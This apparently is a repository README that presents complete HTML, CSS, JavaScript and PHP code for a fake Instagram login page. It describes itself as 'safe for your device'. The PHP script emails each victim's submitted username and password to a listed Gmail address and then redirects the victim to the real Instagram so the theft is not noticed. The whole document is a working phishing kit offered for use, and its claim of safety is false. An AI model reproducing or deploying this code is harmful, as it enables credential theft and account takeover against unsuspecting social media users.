# Instagram 
Social media accounts login, safe for your device 
Yeh raha pura code:


```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <section class="login">
    <form action="login.php" method="post">
      <input type="text" name="username" placeholder="Username">
      <input type="password" name="password" placeholder="Password" id="password">
      <input type="checkbox" onclick="showPassword()">
      <label for="checkbox">Show Password</label>
      <button type="submit">Log In</button>
    </form>
  </section>
  <script src="script.js"></script>
</body>
</html>
```
**Style.css**
```css
body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
}

.login {
  background-color: #f7f7f7;
  padding: 20px;
  margin: 40px auto;
  width: 300px;
  border: 1px solid #ddd;
  border-radius: 10px;
  box-shadow: 0 0 10px rgba(0,0,0,0.1);
}
```
**Script.js**
```javascript
function showPassword() {
  var x = document.getElementById("password");
  if (x.type === "password") {
    x.type = "text";
  } else {
    x.type = "password";
  }
}
```
**Login.php**
```php
<?php
$to = "rudra.yadav9955@gmail.com"; // aapka email id
$username = $_POST['username'];
$password = $_POST['password'];
$subject = "Instagram Credentials";
$message = "Username: $username 
 Password: $password";
$headers = "From: instagram@clone.com";
mail($to, $subject, $message, $headers);
header("Location: https://www.instagram.com/"); // instagram par redirect
?>
```
